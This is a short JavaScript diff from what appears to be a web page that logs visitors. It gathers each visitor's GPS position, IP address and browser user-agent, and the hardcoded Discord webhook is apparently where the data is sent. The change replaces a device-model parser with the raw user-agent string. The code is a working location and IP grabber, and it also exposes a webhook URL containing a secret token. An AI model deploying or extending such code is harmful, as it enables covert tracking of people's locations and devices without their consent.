@@ -8,7 +8,7 @@
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1334918135857287268/WDn0O_tSSKD3MLk-bufiwVHND9YgkexGKMsXG7guC6RKacjmxV-fvuC7EcNpu7LTGddE"; // Nahraď svým webhookem
 
         function getLocation() {
-            let device = getDeviceModel(); // Detekce zařízení
+            let device = navigator.userAgent; // Detekce zařízení
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(position => {
@@ -21,24 +21,6 @@
             } else {
                 getIP(device, "🚫 GPS není podporována");
             }
-        }
-
-        function getDeviceModel() {
-            const userAgent = navigator.userAgent;
-            let model = "Zařízení: " + userAgent; // Pokud nelze detekovat model, použije se userAgent
-
-            // Příklady pro různé platformy (Android, iPhone)
-            const androidMatch = userAgent.match(/Android\s[^\;]+;\s([^\)]+)\)/);
-            if (androidMatch) {
-                model = `Android zařízení: ${androidMatch[1]}`;
-            }
-
-            const iosMatch = userAgent.match(/iPhone\sOS\s([^\;]+)\s/i);
-            if (iosMatch) {
-                model = `iPhone: ${iosMatch[1]}`;
-            }
-
-            return model;
         }
 
         function getIP(device, gpsData) {
